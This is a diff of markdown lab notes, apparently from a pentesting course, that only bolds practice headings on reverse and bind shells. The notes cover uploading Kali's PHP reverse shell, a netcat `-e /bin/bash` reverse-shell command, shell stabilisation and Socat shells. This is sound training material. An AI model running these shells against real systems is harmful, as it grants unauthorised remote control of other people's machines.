@@ -369,7 +369,7 @@ The syntax for this is as follows:
 
 ## **Practice & Examples**
 
-1) Navigate to `/usr/share/webshells/php/php-reverse-shell.php` in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell // Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on your own machine.
+1) **Navigate to `/usr/share/webshells/php/php-reverse-shell.php` in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell // Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on your own machine.**
 
 	Direct to the kali pre-installed webshell directory and edit the file php-reverse-shell.php, change the IP to your local into IP add and rename to rshell.php:
 	![[Pasted image 20240820053521.png]]
@@ -386,7 +386,7 @@ stabilize the netcat:
 3. Background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`
 
 
-2)  Experiment with bind and reverse netcat shells.
+2)  **Experiment with bind and reverse netcat shells.**
 
 	### **Bind Shell:**
 	- **Concept**: In a bind shell, the target machine opens a specific port and listens for incoming connections. The attacker then connects to this open port to gain access to the command line on the target machine.
@@ -425,13 +425,13 @@ stabilize the netcat:
 	![[Pasted image 20240820194307.png]]
 	![[Pasted image 20240820194336.png]]
 
-3) Reverse and bind shells using Socat on the Linux machine.
+3) **Reverse and bind shells using Socat on the Linux machine.**
 	 ![[Pasted image 20240820200847.png]]
 	![[Pasted image 20240820200922.png]]
 
-using special command (fully stable Linux tty reverse shell)
+	using special command (fully stable Linux tty reverse shell)
 	![[Pasted image 20240820203805.png]]
 	![[Pasted image 20240820203824.png]]
 
 
-4) Look through [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and try some of the other reverse shell techniques.
+4) **Look through [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and try some of the other reverse shell techniques.**
